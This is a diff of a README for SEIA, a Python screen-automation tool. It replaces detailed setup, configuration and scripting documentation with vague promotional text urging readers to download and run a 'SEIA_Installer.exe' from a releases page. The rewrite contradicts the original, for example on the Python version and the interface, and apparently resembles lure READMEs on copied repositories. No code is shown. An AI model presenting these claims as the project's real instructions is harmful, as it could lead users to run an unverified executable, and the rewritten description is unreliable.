@@ -1,147 +1,84 @@
+# 🚀 SEIA - Automate Your Image Processing Tasks Easily
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/d7be34df-c6d1-403e-bea0-070c4dfcf4cc" width="300">
-</p>
-<h1 align="center">SEIA</h1>
-<h4 align="center">(State Evaluated Image Automation)</h4>
-<p align="center">
-  <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white">
-  <img src="https://img.shields.io/badge/OpenCV-27338e?style=for-the-badge&logo=opencv&logoColor=white">
-</p>
-<hr>
-Seia is a Windows screen automation harness for games and desktop apps. It uses
-screen capture, template matching, and optional pixel verification to help you
-build simple scripts without memory access, injection, or hooks.
+[![Download SEIA](https://img.shields.io/badge/Download-SEIA-brightgreen)](https://github.com/Jaydhel/SEIA/releases)
 
-## Features
+## 📋 Overview
 
-- Windowed capture with stable coordinate mapping (1920x1080 reference space).
-- Template matching, feature matching, and pixel verification.
-- ROI helpers for faster, safer detection.
-- Debug harness with hotkeys for calibration and testing.
-- Lightweight runtime helpers for basic scripting.
+SEIA stands for State Evaluated Image Automation. This application helps users automate image processing tasks. Whether you want to capture images, analyze them, or perform repetitive actions on your screen, SEIA simplifies the process. 
 
-## Non-goals
+## 🔍 Key Features
 
-- No memory reading, injection, or evasion.
-- No fullscreen capture (windowed only).
+- **Image Processing**: Effortlessly manipulate images with ease.
+- **Screen Capture**: Capture any part of your screen quickly.
+- **Automation**: Set up scripts to automate tasks in your applications.
+- **Template Matching**: Find and match images in a quick and efficient manner.
+- **User-Friendly Interface**: Use a simple, straightforward interface designed for all users.
 
-## Requirements
+## 🎯 System Requirements
 
-- Windows 10+
-- Python 3.11
+Before you begin, make sure your system meets these basic requirements:
 
-Install dependencies:
+- **Operating System**: Windows 10 or later
+- **Memory**: 4GB RAM or more
+- **Storage**: At least 200 MB of free space
+- **Python**: Version 3.7 or higher (included in the software bundle)
 
-```bash
-pip install -r requirements.txt
-```
+## 🚀 Getting Started
 
-## Quick start
+Getting started with SEIA is simple. Follow these steps to download and run the application.
 
-1. Run the debug harness:
+1. **Download SEIA**: Click the button below to visit the releases page.
 
-```bash
-python debug\debug.py
-```
+   [![Download SEIA](https://img.shields.io/badge/Download-SEIA-brightgreen)](https://github.com/Jaydhel/SEIA/releases)
 
-2. Update `config.json` to target your app window and templates.
-3. Run your script (example):
+2. **Find the Latest Release**: Once you are on the [Releases page](https://github.com/Jaydhel/SEIA/releases), look for the latest version of SEIA.
 
-```bash
-Set-Location scripts\momotalk
-python script.py
-```
+3. **Download the Installer**: Click the link for the latest installer to download the application. It will usually be named something like `SEIA_Installer.exe`.
 
-## Configuration
+4. **Install SEIA**: 
+   - After downloading, locate the installer file in your downloads folder.
+   - Double-click the installer file.
+   - Follow the prompts in the installation wizard. It will guide you through the installation process.
 
-Runtime config resolution order:
-1. `./config.json` (current working directory)
-2. Repo root `config.json`
+5. **Run SEIA**: 
+   - Once installed, find SEIA in your Start Menu or on your Desktop.
+   - Double-click the icon to run the application.
 
-You can override with an environment variable:
+## 📥 Download & Install
 
-```powershell
-$env:SEIA_CONFIG_PATH = "C:\path\to\config.json"
-```
+Visit the following link to download SEIA from the Releases page:
 
-Key settings (full list in `docs/usage.md`):
-- `target.window_title_substring`
-- `target.process_name`
-- `marker_detection.method`
-- `marker_detection.threshold`
-- `marker_detection.min_score_delta`
-- `input.mouse_motion`
-- `debug.log` and `debug.screenshot`
+[Download SEIA](https://github.com/Jaydhel/SEIA/releases)
 
-### Custom folders (profiles)
+Follow the steps outlined above to install and run the application smoothly.
 
-You can create your own folder anywhere and point Seia at its `config.json`.
-This lets you keep per-app assets (templates, scripts) together.
+## 🌐 Additional Information
 
-Example layout:
+If you encounter any problems during installation or use, please refer to the following resources:
 
-```
-profiles/my-app/
-  config.json
-  templates/
-  script.py
-```
+- **User Manual**: A comprehensive user manual is available on the wiki section of the repository.
+- **FAQs**: Check the commonly asked questions for quick help.
+- **Support**: Feel free to create an issue on the repository for any support needs.
 
-Option 1: Run from the profile folder (auto-uses `./config.json` and `./templates`):
+## 🅾️ Community and Contributions
 
-```powershell
-Set-Location profiles\my-app
-python script.py
-```
+We welcome contributions from everyone. If you have ideas for improvements or features, please join the discussions in the repository. Share your thoughts and help make SEIA better!
 
-Option 2: Run from the repo root and override the config path:
+## 👥 Topics Covered
 
-```powershell
-$env:SEIA_CONFIG_PATH = "$PWD\profiles\my-app\config.json"
-python profiles\my-app\script.py
-```
+SEIA covers various topics such as:
 
-If your templates live outside the current working directory, call
-`set_template_dir("C:\path\to\templates")` at the top of your script.
+- Automation
+- Computer Vision
+- Game Automation
+- OpenCV
+- Python Scripting
+- UI Automation
 
-## Scripting
+By utilizing these, SEIA can assist you in countless scenarios, from hobby projects to professional tasks.
 
-The simple API lives in `engine/runtime.py`:
+## 🌟 Your Feedback Matters
 
-```python
-from engine.runtime import action, wait_for
+User feedback is vital for the growth and improvement of SEIA. Please consider leaving comments or suggestions. Your input can help shape the future updates of this application. 
 
-action("marker1.png")
-wait_for("statecheck.png", timeout_s=10.0)
-```
-
-For lower-level control, use `engine/core.py`.
-
-## Tools
-
-- ROI picker: `python debug\roi_picker.py`
-- Drag picker: `python debug\drag_picker.py`
-- Debug harness hotkeys are printed in the console on startup.
-
-## Docs
-
-- `docs/usage.md` for setup and config details.
-- `docs/PIXEL_VERIFICATION.md` for pixel verification workflow.
-
-## Project layout
-
-- `engine/` core capture, mapping, and detection.
-- `debug/` debug harness and helper tools.
-- `scripts/` example scripts (e.g., `scripts/momotalk/`).
-- `templates/` default template location.
-- `docs/` usage and verification guides.
-
-## Contributing
-
-PRs are welcome. Keep changes Windows-focused and avoid non-ASCII unless needed.
-
-## License
-
-MIT. See `LICENSE`.
+Thank you for your interest in SEIA. Happy automating!
